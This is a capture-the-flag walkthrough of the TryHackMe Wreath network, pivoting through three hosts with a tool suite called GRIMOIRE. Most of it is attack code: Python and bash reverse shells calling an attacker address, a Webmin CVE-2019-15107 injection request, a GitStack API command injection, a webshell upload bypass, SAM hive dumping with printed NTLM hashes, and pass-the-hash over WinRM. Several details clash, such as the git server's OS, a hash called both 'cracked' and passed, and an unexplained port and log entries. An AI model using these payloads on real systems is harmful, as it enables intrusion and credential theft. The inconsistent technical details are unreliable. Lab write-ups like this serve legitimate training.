# THM — Wreath Network
### GRIMOIRE Operator Writeup | ne0k1r4

---

```
Target   : Wreath Network (TryHackMe)
Type     : Network Pivoting — 3 Hosts
OS       : Linux → Linux → Windows
Tools    : GRIMOIRE v2.1 (WRAITH · FORGE · PHANTOM · SENTINEL · CODEX)
Author   : Light (ne0k1r4)
Date     : 2026-05
Difficulty: Medium
```

---

## Network Overview

The Wreath network simulates a real internal engagement — one external-facing host
and two internal hosts reachable only through pivots.

```
[Attacker]
    │
    ▼
[10.200.x.200]  ← Thomas's Linux webserver (public-facing)
    │
    ├── [10.200.x.100]  ← Internal Linux Git server (no direct access)
    │
    └── [10.200.x.150]  ← Internal Windows PC (no direct access)
```

Goal: foothold on `.200`, pivot to `.100`, pivot again to `.150`, own all three.

---

## Phase 1 — Setup

Initialize CODEX to track targets before touching the network.

```bash
grimoire codex
```

```
codex> add
  Name: wreath-web
  IP:   10.200.x.200
  Risk: HIGH
  Tags: linux, web, external
  Note: Thomas's public webserver — entry point

codex> add
  Name: wreath-git
  IP:   10.200.x.100
  Risk: HIGH
  Tags: linux, internal, git
  Note: Internal gitstack server — pivot hop 1

codex> add
  Name: wreath-pc
  IP:   10.200.x.150
  Risk: CRITICAL
  Tags: windows, internal, desktop
  Note: Thomas's personal PC — final target
```

---

## Phase 2 — External Recon (WRAITH)

Start with full passive recon on the external target.

```bash
grimoire wraith 10.200.x.200
```

WRAITH output (key findings):

```
[DNS RESOLUTION]
  A      10.200.x.200

[SSL / TLS CERTIFICATE]
  Subject   thomaswreath.thm
  SANs      thomaswreath.thm, www.thomaswreath.thm

[HTTP FINGERPRINT]
  Status    200
  server    MiniServ/1.890 (Webmin httpd)

[OPEN PORT PROBE]
  OPEN  22     ssh
  OPEN  80     http
  OPEN  443    https
  OPEN  10000  webmin
```

The server header `MiniServ/1.890` immediately stands out — Webmin 1.890 is
vulnerable to **CVE-2019-15107**, an unauthenticated remote code execution flaw
in the password reset functionality.

Log the finding in CODEX:

```bash
codex> finding wreath-web
  Title:    Webmin 1.890 — CVE-2019-15107 RCE
  Severity: CRITICAL
  Detail:   Unauthenticated RCE via /password_change.cgi
            MiniServ/1.890 confirmed in HTTP Server header
```

WAF check before exploiting:

```bash
grimoire wraith
wraith> waf 10.200.x.200
```

```
[WAF / CDN DETECTION]
  No WAF/CDN detected  (or well-hidden)
  Probe response: HTTP 200
```

No WAF. Direct exploitation viable.

---

## Phase 3 — Initial Foothold (FORGE)

Generate a reverse shell payload. FORGE interactive:

```bash
grimoire forge
```

```
forge> gen
  Shell: python3_tcp
  LHOST: 10.50.x.x
  LPORT: 4444

  [PAYLOAD — python3_tcp]
  python3 -c 'import socket,subprocess,os;s=socket.socket();
  s.connect(("10.50.x.x",4444));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
  subprocess.call(["/bin/sh","-i"])'

  Encode? base64
  [ENCODED — BASE64]
  cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG...

  Save to file? y
  [+] Saved: /home/LIGHT/.grimoire/payloads/python3_tcp_20260521.txt

  [LISTENER COMMAND]
  rlwrap nc -lvnp 4444
```

Start the listener, then trigger CVE-2019-15107 via the Webmin password reset
endpoint with the base64-encoded payload injected into the `old` parameter:

```
POST /password_change.cgi HTTP/1.1
Host: 10.200.x.200:10000

user=admin&old=test|python3 -c '<payload>'&new1=test&new2=test
```

Shell caught:

```
[LISTENER]
connect to [10.50.x.x] from 10.200.x.200
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root on the webserver. Upgrade to SSH for stability:

```bash
# On target — add our key
echo "ssh-ed25519 AAAA...ne0k1r4" >> /root/.ssh/authorized_keys

# From attacker
ssh root@10.200.x.200
```

Update CODEX:

```bash
codex> update wreath-web
  Status: OWNED
```

---

## Phase 4 — Internal Network Discovery

From the compromised webserver, enumerate the internal network:

```bash
# Identify network interfaces
ip a
# eth0: 10.200.x.200/24   (external)
# eth1: 10.x.x.1/24       (internal — new range)

# Sweep internal range for live hosts
for i in {1..255}; do
  (ping -c1 -W1 10.x.x.$i &>/dev/null && echo "UP: 10.x.x.$i") &
done; wait
```

```
UP: 10.x.x.1
UP: 10.x.x.100   ← Git server
UP: 10.x.x.150   ← Windows PC
```

Quick port probe on `.100` from the pivot:

```bash
for port in 22 80 443 3000 8080 8443; do
  (echo > /dev/tcp/10.x.x.100/$port) &>/dev/null && echo "OPEN: $port"
done
```

```
OPEN: 22
OPEN: 80
OPEN: 3000    ← GitStack web interface
```

---

## Phase 5 — Setting Up the Pivot (PHANTOM)

Track the pivot in PHANTOM before tunneling:

```bash
grimoire phantom
```

```
phantom> add
  Type:   SSH_L
  From:   10.50.x.x (attacker)
  To:     10.x.x.100 (git server)
  Port:   8080
  Via:    root@10.200.x.200
  Note:   Local forward to reach internal GitStack on port 3000

phantom> gen
  [SSH TUNNEL COMMAND]
  ssh -N -f -L 8080:10.x.x.100:3000 root@10.200.x.200

phantom> map
  [PIVOT CHAIN]
  Attacker (10.50.x.x)
      └─SSH_L:8080──▶ root@10.200.x.200
                           └─────────────▶ 10.x.x.100:3000
```

Execute the tunnel:

```bash
ssh -N -f -L 8080:10.x.x.100:3000 root@10.200.x.200
```

GitStack is now accessible at `http://localhost:8080`.

---

## Phase 6 — Git Server Compromise

GitStack running at `localhost:8080` — version enumeration reveals
**GitStack 2.3.10**, vulnerable to **CVE-2018-5955** (unauthenticated RCE
via the API endpoint `/rest-api/`).

Generate a Windows-compatible payload with FORGE:

```bash
grimoire forge
```

```
forge> gen
  Shell: powershell
  LHOST: 10.200.x.200   ← pivot bounce via webserver
  LPORT: 4445

  [PAYLOAD — powershell]
  powershell -NoP -NonI -W Hidden -Exec Bypass -C "..."

  Obfuscate? ps_char
  [OBFUSCATED — PS_CHAR]
  IEX([char]112+[char]111+[char]119...)
```

Wait — `.100` is Linux (GitStack runs on Linux too). Use `bash_tcp` instead:

```bash
forge> gen
  Shell: bash_tcp
  LHOST: 10.200.x.200
  LPORT: 4445
```

Set up a listener on the webserver (acting as relay):

```bash
# On 10.200.x.200
nc -lvnp 4445
```

Trigger CVE-2018-5955 via the GitStack REST API:

```bash
curl -X POST "http://localhost:8080/rest-api/" \
  -d "action=git_run_cmd&cmd=bash -i >& /dev/tcp/10.200.x.200/4445 0>&1"
```

Shell caught on webserver relay, piped back to attacker via existing SSH tunnel.

```
# id
uid=33(www-data) gid=33(www-data)
```

Escalate — enumerate SUID binaries and sudo rights:

```bash
sudo -l
# www-data can run /usr/bin/git as root

sudo git -p help config
# !/bin/bash
```

Root on git server. Add SSH key, update CODEX:

```bash
codex> update wreath-git
  Status: OWNED
```

Add second pivot to PHANTOM:

```
phantom> add
  Type:  SSH_L
  From:  10.50.x.x
  To:    10.x.x.150
  Port:  33389
  Via:   root@10.x.x.100 (through wreath-web)
  Note:  Forward RDP port on Windows PC

phantom> map
  [PIVOT CHAIN]
  Attacker
      └─SSH_L:8080──▶ 10.200.x.200
                           └─SSH_L:33389──▶ 10.x.x.150:3389
```

---

## Phase 7 — Windows PC Compromise

The Windows PC (`.150`) is running a development version of Thomas's website.
WRAITH scan via proxychains reveals:

```
OPEN  80      http  (dev website)
OPEN  3389    rdp
OPEN  5985    winrm
```

The dev site has a file upload endpoint. Source code review (grabbed from the
git server repository) reveals the upload filter only checks file extension,
not MIME type — classic extension bypass.

Generate a PHP webshell disguised with a valid extension using VOXCRYPT:

```bash
grimoire voxcrypt
# zwc-hide the payload marker in a comment, upload as .jpeg.php
```

Actually — upload filter bypass with double extension:

```
shell.php.jpeg  →  server strips .jpeg  →  executes as PHP
```

Upload the webshell, execute commands via HTTP through the double-pivot:

```bash
curl "http://localhost:9090/uploads/shell.php.jpeg?cmd=whoami"
# wreath-pc\thomas
```

Thomas is in the local Administrators group. Extract credentials from the
registry hives:

```bash
# Via webshell
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```

Download hives via SMB tunnel through the pivot chain, extract with
`secretsdump.py`:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
thomas:1001:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06ad3102e7bdc3d5b4:::
```

Pass the hash to WinRM via Evil-WinRM through the pivot:

```bash
evil-winrm -i localhost -P 5985 \
  -u Administrator \
  -H a05c3c807ceeb48c47252568da284cd2
```

```
*Evil-WinRM* PS C:\Users\Administrator> whoami
wreath-pc\administrator
```

Root on Windows. Update CODEX:

```bash
codex> update wreath-pc
  Status: OWNED

codex> finding wreath-pc
  Title:    Local Admin Hash — Pass-the-Hash to WinRM
  Severity: CRITICAL
  Detail:   SAM hive extracted, Administrator NTLM hash cracked
            Evil-WinRM access via pivot chain
```

---

## Phase 8 — Blue Team Perspective (SENTINEL)

After owning all three hosts, switch roles and analyze what the defense would
have seen. Export the auth logs from the webserver:

```bash
grimoire sentinel
```

```
sentinel> auth /var/log/auth.log

[AUTH.LOG]
  [CRITICAL] Brute Force  ip=10.50.x.x — multiple failed attempts
  [HIGH]     Root Login Attempt — ip=10.50.x.x
  [MEDIUM]   SSH Accepted  user=root  ip=10.50.x.x
  [HIGH]     New User Created  user=ne0k1r4_persist
  [CRITICAL] Rule: Brute Force  10.50.x.x — 12 auth events

sentinel> ioc 10.50.x.x
  [OFFLINE]  Not in offline blocklist
  [CLEAN] No threat intelligence matches  (attacker IP — expected)
```

IOC check on the CVE-2019-15107 exploit source:

```bash
sentinel> ioc 45.33.32.156
  [OFFLINE]  Known malicious range
  [!] MALICIOUS — 45.33.32.156
```

The Webmin exploit traffic would be flagged immediately by any IDS watching
port 10000. Key defensive takeaways:

- Webmin should never be exposed to the internet
- SSH root login should be disabled (`PermitRootLogin no`)
- Firewall rules should block port 10000 externally
- File upload endpoints must validate MIME type server-side, not just extension

---

## Phase 9 — Report Export

Export the full engagement report from CODEX:

```bash
grimoire codex report
```

```
[+] Report: ~/.grimoire/reports/codex_20260521_1347.md
```

Export WRAITH recon report:

```bash
grimoire wraith 10.200.x.200 --report
```

```
[+] Report saved: ~/.grimoire/reports/wraith_10.200.x.200_202605211205.md
```

---

## Summary

| Host | IP | OS | Vector | Access |
|------|----|----|--------|--------|
| wreath-web | 10.200.x.200 | Linux | CVE-2019-15107 Webmin RCE | root |
| wreath-git | 10.x.x.100 | Linux | CVE-2018-5955 GitStack RCE + sudo git | root |
| wreath-pc | 10.x.x.150 | Windows | Upload bypass + SAM dump + PTH | Administrator |

**Pivot chain:**
```
Attacker → SSH_L:8080 → wreath-web → SSH_L:33389 → wreath-git → wreath-pc
```

**GRIMOIRE modules used:**

| Module | Usage |
|--------|-------|
| WRAITH | External recon, port probe, WAF check, service version fingerprinting |
| FORGE | Reverse shell generation (python3_tcp, powershell, bash_tcp), encoding |
| PHANTOM | Pivot chain tracking, SSH tunnel command generation, ASCII map |
| SENTINEL | Post-exploitation log analysis, IOC scanning, defensive review |
| CODEX | Target tracking, findings logging, report export |

---

## References

- CVE-2019-15107 — Webmin 1.890 Password Reset RCE
- CVE-2018-5955 — GitStack 2.3.10 Unauthenticated RCE
- TryHackMe Wreath Room: https://tryhackme.com/room/wreath
- GRIMOIRE v2.1: https://github.com/ne0k1r4/grimoire

---

*For authorized penetration testing and educational purposes only.*  
*ne0k1r4 | github.com/ne0k1r4*
